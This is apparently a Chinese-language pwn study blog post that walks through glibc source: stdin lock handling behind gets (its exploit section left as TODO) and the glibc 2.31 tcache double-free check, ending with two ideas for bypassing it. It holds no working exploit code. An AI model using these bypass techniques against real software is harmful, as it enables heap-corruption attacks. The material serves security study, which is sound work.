函数开始时使用 `_IO_acquire_lock` 获取锁，结束时使用 `_IO_release_lock` 释放锁。获取锁会告知其它线程 `stdin` 当前正在被使用中，所以其余任何尝试访问 stdin 的线程都将被强制等待，直到该线程释放锁后，其它线程才可以获取锁。

因此，`FILE` 有一个 [\_lock](https://elixir.bootlin.com/glibc/glibc-2.41/source/libio/bits/types/struct_FILE.h#L84) 字段，它是一个指向 [\_IO_lock_t](https://elixir.bootlin.com/glibc/glibc-2.41/source/sysdeps/nptl/stdio-lock.h#L26) 的指针：

```c {49} collapse={1-46}
struct _IO_FILE;
struct _IO_marker;
struct _IO_codecvt;
struct _IO_wide_data;

/* During the build of glibc itself, _IO_lock_t will already have been
   defined by internal headers.  */
#ifndef _IO_lock_t_defined
typedef void _IO_lock_t;
#endif

/* The tag name of this struct is _IO_FILE to preserve historic
   C++ mangled names for functions taking FILE* arguments.
   That name should not be used in new code.  */
struct _IO_FILE
{
  int _flags;  /* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr; /* Current read pointer */
  char *_IO_read_end; /* End of get area. */
  char *_IO_read_base; /* Start of putback+get area. */
  char *_IO_write_base; /* Start of put area. */
  char *_IO_write_ptr; /* Current put pointer. */
  char *_IO_write_end; /* End of put area. */
  char *_IO_buf_base; /* Start of reserve area. */
  char *_IO_buf_end; /* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2:24;
  /* Fallback buffer to use when malloc fails to allocate one.  */
  char _short_backupbuf[1];
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

```c
typedef struct {
  int lock;
  int cnt;
  void *owner;
} _IO_lock_t;
```

:::important
这个 `_lock` 指针指向的就是我们 `rdi` 中的 `_IO_stdfile_0_lock`，先记住这点，下面有用。
:::

### \_IO_acquire_lock / \_IO_release_lock

```c
#define _IO_USER_LOCK 0x8000

# ifdef __EXCEPTIONS
#  define _IO_acquire_lock(_fp) \
  do {                                                                    \
    FILE *_IO_acquire_lock_file                                           \
 __attribute__((cleanup (_IO_acquire_lock_fct)))                          \
 = (_fp);                                                                 \
    _IO_flockfile (_IO_acquire_lock_file);
# else
#  define _IO_acquire_lock(_fp) _IO_acquire_lock_needs_exceptions_enabled
# endif
# define _IO_release_lock(_fp) ; } while (0)
```

`__attribute__((cleanup (_IO_acquire_lock_fct))) = (_fp);` 主要就是将 cleanup 函数 `_IO_acquire_lock_fct` 和 `_fp` 进行一个绑定。使得在 `do { ... } while (0)` 作用域结束后自动对 `_fp` 调用 `_IO_acquire_lock_fct` 进行 cleanup 。

```c
static inline void
__attribute__ ((__always_inline__))
_IO_acquire_lock_fct (FILE **p)
{
  FILE *fp = *p;
  if ((fp->_flags & _IO_USER_LOCK) == 0)
    _IO_funlockfile (fp);
}
```

`_IO_USER_LOCK` 标志是用来记录当前 I/O 流是否处于由用户显式请求的锁定状态。

`_IO_acquire_lock_fct` 这个 cleanup 函数主要是，若 `FILE` 没有设置 `_IO_USER_LOCK` 标志，就对该文件解锁。

我们发现这加锁解锁层层封装了好几个宏：

```c
# define _IO_flockfile(_fp) \
  if (((_fp)->_flags & _IO_USER_LOCK) == 0) _IO_lock_lock (*(_fp)->_lock)
# define _IO_funlockfile(_fp) \
  if (((_fp)->_flags & _IO_USER_LOCK) == 0) _IO_lock_unlock (*(_fp)->_lock)
```

如果用户没有显示请求上锁/解锁，就调用后面的函数，否则说明用户之前已经调用过 `flockfile` 或者 `funlockfile`，这个 if 将确保它不会重复上锁/解锁。

这还没完，真正执行最后上锁解锁操作的是下面的 `_IO_lock_lock` 和 `_IO_lock_unlock`。

### \_IO_lock_lock / \_IO_lock_unlock

```c
#define _IO_lock_lock(_name) \
  do {                                               \
    void *__self = THREAD_SELF;                      \
    if (SINGLE_THREAD_P && (_name).owner == NULL)    \
      {                                              \
 (_name).lock = LLL_LOCK_INITIALIZER_LOCKED;         \
 (_name).owner = __self;                             \
      }                                              \
    else if ((_name).owner != __self)                \
      {                                              \
 lll_lock ((_name).lock, LLL_PRIVATE);               \
 (_name).owner = __self;                             \
      }                                              \
    else                                             \
      ++(_name).cnt;                                 \
  } while (0)

#define _IO_lock_unlock(_name) \
  do {                                               \
    if (SINGLE_THREAD_P && (_name).cnt == 0)         \
      {                                              \
 (_name).owner = NULL;                               \
 (_name).lock = 0;                                   \
      }                                              \
    else if ((_name).cnt == 0)                       \
      {                                              \
 (_name).owner = NULL;                               \
 lll_unlock ((_name).lock, LLL_PRIVATE);             \
      }                                              \
    else                                             \
      --(_name).cnt;                                 \
  } while (0)
```

这里的 `_name` 即 `_IO_stdfile_0_lock`。`owner` 字段存储当前持有锁的线程的 TLS 结构体地址。

加锁时，先获取当前线程 ID，即 `THREAD_SELF`，然后分三种情况：

1. 单线程优化：如果是单线程环境并且锁没被占用，直接把锁设为 `LOCKED`，并设置 `owner`
2. 多线程竞争：如果 `(_name).owner != __self`，即锁不属于当前线程，是其他线程持有，则调用 `lll_lock()`，阻塞直到锁可用后再尝试获取锁
3. 递归加锁：如果锁属于当前线程，说明同一线程再次加锁，则增加计数器 `cnt`

:::tip
有关 `lll_lock()` 的作用，简单来说就是：无论锁当前是否空闲，我调用它，都能保证最终自己持有这个锁（要么立刻成功，要么阻塞直到可用）。

因为它的实现是对 `futex (fast userspace mutex)` 的封装，futex 的特性为：

- 无竞争路径：如果锁的内部状态是「未锁」，原子操作直接把它设为「已锁」，立即返回，非常快
- 有竞争路径：如果发现锁已被其它线程持有，就会进入 futex 系统调用，把自己挂到等待队列上，一旦对方解锁唤醒，就可以立即获取到锁

  :::

释放锁的过程也很好理解：

1. 单线程优化：如果 `cnt` 为 0（没有递归加锁），直接清空 `owner`，把锁标记为解锁
2. 多线程情况：如果 `cnt` 为 0，清空 `owner`，并调用 `lll_unlock()` 释放 futex 锁
3. 递归解锁：如果 `cnt > 0`，说明是递归锁的一层，只会将 `cnt` 减一，不真正释放锁

### \_IO_stdfile_0_lock in rdi ?

感觉好像扯了一堆没用的，现在我们研究研究为啥 rdi 是 `_IO_stdfile_0_lock` 而不是别的。这里如果你使用源码级调试的话会看得更清楚一点。

根据上面的分析，我们知道 `gets` 在最后返回的时候会调用 `_IO_release_lock (stdin)` 来释放锁。如果你还没忘记的话，我们定义 `_IO_acquire_lock(_fp)` 的时候设置了 cleanup 函数，将 `_fp` 和 `_IO_acquire_lock_fct` 绑定，一旦离开此作用域，就会自动调用 `_IO_acquire_lock_fct (_fp)`，而它内部又是通过 `_IO_funlockfile (fp)` 调用了 `_IO_lock_unlock (*(_fp)->_lock)`，完成这一整个释放锁的流程并返回。而最后调用的 `_IO_lock_unlock (*(_fp)->_lock)` 使用的参数正是 `_IO_stdfile_0_lock`。

很关键的一点就是，`_IO_release_lock(_fp)` 也属于这个定义域，所以如果 `_IO_release_lock(_fp)` 返回了，也会自动调用上面设置的 cleanup 函数。

<center>
  <img src="https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.96a43f63z9.avif" alt="" />
  <img src="https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.7pnv6o8tk.avif" alt="" />
  <img src="https://cdn.jsdmirror.com/gh/CuB3y0nd/picx-images-hosting@master/.esvqmae96.avif" alt="" />
</center>

观察上面的调试输出，我们执行完 `_IO_lock_unlock (*(_fp)->_lock)` 后就直接返回到了 `main`，并且执行完这个函数后在 epilogue 阶段并没有恢复 rdi，也就是说 rdi 会沿用最后一个被调用的函数的 rdi，即 `_IO_stdfile_0_lock` 这个值。

<em>
呼呼～长舒一口气～写到这里已经凌晨三点了，因为白天上了一天课（简直是虚度光阴……），只能晚上科研力。好在明天课免修了，我可以一直睡到早上十点半再起来，七个小时，应该也够我睡的了 LOL

要我说，这才是大学生活该有的样子啊，哈哈哈～
</em>

至此，我们已经搞清楚了整个流程，下面就研究如何利用吧～

## Exploit

TODO

# 薛定谔的 free chunks: Double Free, Double Fun ?

:::tip
基于 [glibc-2.31](https://elixir.bootlin.com/glibc/glibc-2.31/source) 的源码。
:::

宏观上来看，程序调用 `free` 函数首先会进入 `__libc_free`，在这里主要是做了一些初始化工作，诸如看看有没有 `__free_hook`、是不是 `mmap` 出来的、初始化 `tcache_perthread_struct` 等。然后调用 `_int_free` 函数，这个函数才是真正负责分门别类，确定最终我们 free 的 chunk 应该被放到哪里的地方。

## Related Structures / Macros Definitions

```c
/* We overlay this structure on the user-data portion of a chunk when
   the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry {
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key;
} tcache_entry;

/* There is one of these for each thread, which contains the
   per-thread cache (hence "tcache_perthread_struct").  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */
typedef struct tcache_perthread_struct {
  uint16_t counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

static __thread tcache_perthread_struct *tcache = NULL;
```

## Related Functions

先看看被 free 的 chunk 是怎么被放入 tcachebin 的：

```c
/* Caller must ensure that we know tc_idx is valid and there's room
   for more chunks.  */
static __always_inline void tcache_put(mchunkptr chunk, size_t tc_idx) {
  tcache_entry *e = (tcache_entry *)chunk2mem(chunk);

  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache;

  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```

- 当 chunk 被放入 tcache 时，glibc 会把 data 部分视作 `tcache_entry`
- 之后将当前线程的 `tcache_perthread_struct` 结构体地址写入到 `key` 字段（与 `bk` 重叠）
- 接着设置 `next` 字段指向当前 tcachebin 中的下一个 free chunk（与 `fd` 重叠）
- 然后将当前 tcachebin 的 header 设为这个新放入的 chunk
- 增加此 bin 的 counts

然后再看 double free 检查：

```c
#if USE_TCACHE
{
  size_t tc_idx = csize2tidx(size);
  if (tcache != NULL && tc_idx < mp_.tcache_bins) {
    /* Check to see if it's already in the tcache.  */
    tcache_entry *e = (tcache_entry *)chunk2mem(p);

    /* This test succeeds on double free.  However, we don't 100%
       trust it (it also matches random payload data at a 1 in
       2^<size_t> chance), so verify it's not an unlikely
       coincidence before aborting.  */
    if (__glibc_unlikely(e->key == tcache)) {
      tcache_entry *tmp;
      LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx);
      for (tmp = tcache->entries[tc_idx]; tmp; tmp = tmp->next)
        if (tmp == e)
          malloc_printerr("free(): double free detected in tcache 2");
      /* If we get here, it was a coincidence.  We've wasted a
         few cycles, but don't abort.  */
    }

    if (tcache->counts[tc_idx] < mp_.tcache_count) {
      tcache_put(p, tc_idx);
      return;
    }
  }
}
#endif
```

这里就只讲关键部分了。首先它将我们要 free 的 chunk 的 data 部分转换为了 `tcache_entry` 结构体，使用 `e` 指代。如果 `e->key == tcache` 的话，就怀疑是不是有 double free 的风险，因为我们知道，当第一次 free 时，glibc 会写 `e->key = tcache`。但并不能因此而直接下定论说这就是一个 double free，因为用户写入的数据有概率正巧等于 `tcache`，虽说只有 `1/2^<size_t>` 的极小概率，但也不能忽略。所以还需要做进一步检查，确定我们要 free 的 chunk 是否已经存在于 tcachebin 中了，于是就进入 for 循环，对这个 tcachebin 中的每一个 free chunk 做判断，如果它与 `e` 相同，则说明确实触发了 double free 。

那么为了绕过 double free，可行的方案可能有：

1. 把 key 改成非 tcache 值，让第一步检查失效
2. 篡改 next 指针，让遍历不到目标 chunk，从而绕过第二步的 in list 检查
